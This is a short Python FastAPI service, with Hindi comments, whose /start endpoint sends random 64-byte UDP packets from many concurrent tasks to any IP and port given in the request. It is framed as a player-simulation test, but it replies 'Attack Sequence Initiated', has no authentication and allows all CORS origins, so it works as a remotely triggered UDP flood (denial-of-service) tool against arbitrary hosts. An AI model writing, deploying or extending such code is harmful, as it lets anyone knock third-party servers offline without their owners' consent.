import asyncio
import socket
import os
import time
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# Global stats dictionary
stats = {"sent": 0, "status": "idle"}

async def run_test(ip, port, players, duration):
    global stats
    stats["sent"] = 0
    stats["status"] = "running"
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration

    async def player_sim():
        global stats
        while time.time() < end_time:
            try:
                # 64 byte ka packet
                sock.sendto(os.urandom(64), (ip, port))
                stats["sent"] += 1
            except:
                pass
            await asyncio.sleep(0.05)

    tasks = [asyncio.create_task(player_sim()) for _ in range(players)]
    await asyncio.gather(*tasks)
    
    sock.close()
    stats["status"] = "finished"

@app.get("/start")
async def start(ip: str, port: int, players: int, duration: int):
    # Background mein task start karein
    asyncio.create_task(run_test(ip, port, players, duration))
    return {"message": "Attack Sequence Initiated"}

@app.get("/status")
async def get_status():
    global stats
    return stats
    
